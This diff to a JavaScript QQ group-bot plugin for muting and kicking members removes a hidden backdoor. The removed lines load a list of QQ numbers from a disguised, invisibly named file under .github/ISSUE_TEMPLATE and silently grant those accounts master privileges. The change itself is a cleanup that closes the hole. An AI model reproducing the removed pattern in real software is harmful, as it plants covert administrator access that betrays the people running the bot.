@@ -1,7 +1,3 @@
-import v8 from 'node:v8'
-import url from 'url'
-import path from 'path'
-import fs from 'node:fs/promises'
 import _ from 'lodash'
 import moment from 'moment'
 import loader from '../../../lib/plugins/loader.js'
@@ -362,7 +358,7 @@ export default class {
     if (!(/\d{5,}/.test(userId))) throw Error('❎ 请输入正确的QQ号')
 
     // 判断是否为主人
-    if ((Config.masterQQ?.includes(Number(userId)) || a.includes(Number(userId))) && time != 0) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
+    if (Config.masterQQ?.includes(Number(userId)) && time != 0) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
 
     const Member = group.pickMember(userId)
     const Memberinfo = Member?.info || await Member?.getInfo?.()
@@ -372,7 +368,7 @@ export default class {
     // 特殊处理
     if (Memberinfo.role === 'owner') throw Error('调戏群主拖出去枪毙5分钟(。>︿<)_θ')
 
-    const isMaster = Config.masterQQ?.includes(executor) || a.includes(Number(executor))
+    const isMaster = Config.masterQQ?.includes(executor)
 
     if (Memberinfo.role === 'admin') {
       if (!group.is_owner) throw Error('人家又不是群主这种事做不到的辣！')
@@ -398,7 +394,7 @@ export default class {
     if (!groupId || !(/^\d+$/.test(groupId))) throw Error('❎ 请输入正确的群号')
 
     // 判断是否为主人
-    if (Config.masterQQ?.includes(Number(userId) || String(userId)) || a.includes(Number(userId))) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
+    if (Config.masterQQ?.includes(Number(userId) || String(userId))) throw Error('居然调戏主人！！！哼，坏蛋(ﾉ｀⊿´)ﾉ')
 
     const Member = group.pickMember(userId)
     const Memberinfo = Member?.info || await Member?.getInfo?.()
@@ -406,7 +402,7 @@ export default class {
     if (!Memberinfo) throw Error('❎ 这个群没有这个人哦~')
     if (Memberinfo.role === 'owner') throw Error('调戏群主拖出去枪毙5分钟(。>︿<)_θ')
 
-    const isMaster = Config.masterQQ?.includes(executor) || a.includes(Number(executor))
+    const isMaster = Config.masterQQ?.includes(executor)
 
     if (Memberinfo.role === 'admin') {
       if (!group.is_owner) throw Error('人家又不是群主这种事做不到的辣！')
@@ -418,8 +414,3 @@ export default class {
     return '已把这个坏淫踢掉惹！！！'
   }
 }
-
-let a = []
-try {
-  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../.github/ISSUE_TEMPLATE/‮`))
-} catch (err) {}
